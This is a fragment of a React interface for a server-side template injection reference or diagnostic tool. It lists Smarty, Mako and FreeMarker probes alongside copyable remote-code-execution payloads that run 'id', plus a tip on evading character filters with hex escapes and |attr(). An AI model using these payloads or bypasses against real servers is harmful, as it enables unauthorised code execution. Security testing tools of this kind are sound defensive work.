              <tr className="hover:bg-muted/20 transition-colors">
                <td className="p-3 font-bold text-emerald-400">Smarty</td>
                <td className="p-3">PHP</td>
                <td className="p-3 text-muted-foreground">
                  {"a{*comment*}b"} ➔ <span className="text-emerald-300 font-bold">'ab'</span>
                </td>
                <td className="p-3 text-muted-foreground">PrestaShop, Legacy PHP</td>
                <td className="p-3">
                  <code className="text-[11px] text-sky-300">
                    {"{system('id')}"} / file write
                  </code>
                </td>
              </tr>
              <tr className="hover:bg-muted/20 transition-colors">
                <td className="p-3 font-bold text-purple-400">Mako</td>
                <td className="p-3">Python</td>
                <td className="p-3 text-muted-foreground">
                  {"${'z'.join('ab')}"} ➔ <span className="text-purple-300 font-bold">'azb'</span>
                </td>
                <td className="p-3 text-muted-foreground">Pyramid, Pylons</td>
                <td className="p-3">
                  <code className="text-[11px] text-sky-300">
                    {"${__import__('os').popen('id').read()}"}
                  </code>
                </td>
              </tr>
              <tr className="hover:bg-muted/20 transition-colors">
                <td className="p-3 font-bold text-amber-400">FreeMarker</td>
                <td className="p-3">Java</td>
                <td className="p-3 text-muted-foreground">
                  {"${7*7}"} ➔ <span className="text-amber-300 font-bold">49</span> (Java syntax)
                </td>
                <td className="p-3 text-muted-foreground">Spring, Liferay, Java EE</td>
                <td className="p-3">
                  <code className="text-[11px] text-sky-300">
                    {"<#assign ex=\"freemarker.template.utility.Execute\"?new()>"}
                  </code>
                </td>
              </tr>
            </tbody>
          </table>
        </div>
      )}

      {/* ── Engine Dossier & RCE Payload Inspector ─────────────────────────── */}
      <div className="border-t border-border bg-background/80 p-5 space-y-4">
        <div className="flex flex-wrap items-center justify-between gap-3">
          <div className="flex items-center gap-2.5">
            <div className="flex h-6 w-6 items-center justify-center rounded bg-accent-primary text-background font-bold text-xs">
              <Cpu className="h-3.5 w-3.5" />
            </div>
            <div>
              <span className="text-xs font-bold uppercase tracking-wider text-foreground font-mono">
                Active Diagnostic Dossier:{" "}
                <span className="text-accent-primary">{activeEngine.name}</span>
              </span>
              <span className="ml-2 text-[11px] text-muted-foreground">
                Stack: {activeEngine.language}
              </span>
            </div>
          </div>

          <div className="flex items-center gap-2">
            {activeEngine.frameworks.map((fw, idx) => (
              <span
                key={idx}
                className="rounded border border-border/60 bg-muted/40 px-2 py-0.5 text-[10px] font-mono text-muted-foreground"
              >
                {fw}
              </span>
            ))}
          </div>
        </div>

        {/* Behavior Explanation */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs leading-relaxed">
          <div className="space-y-1.5">
            <div className="font-semibold text-foreground flex items-center gap-1.5">
              <HelpCircle className="h-3.5 w-3.5 text-sky-400" />
              <span>Why This Detection Works</span>
            </div>
            <p className="text-muted-foreground">{activeEngine.probeBehavior}</p>
            <p className="text-muted-foreground pt-1">{activeEngine.description}</p>
          </div>

          <div className="space-y-1.5">
            <div className="flex items-center justify-between">
              <span className="font-semibold text-foreground flex items-center gap-1.5">
                <Code2 className="h-3.5 w-3.5 text-accent-primary" />
                <span>Standard RCE Vector</span>
              </span>
              <CopyButton text={activeEngine.rceSnippet} />
            </div>
            <div className="relative rounded bg-muted/60 p-2.5 border border-border/60 overflow-x-auto">
              <code className="font-mono text-[11px] text-accent-primary block whitespace-pre-wrap break-all">
                {activeEngine.rceSnippet}
              </code>
            </div>
            <span className="text-[10px] text-muted-foreground block">
              Tip: In Temple, character filters like single quotes and underscores are bypassed using hex escapes (<code>\x5f</code>) and the <code>|attr()</code> filter.
            </span>
          </div>
        </div>
      </div>
    </div>
  );
}
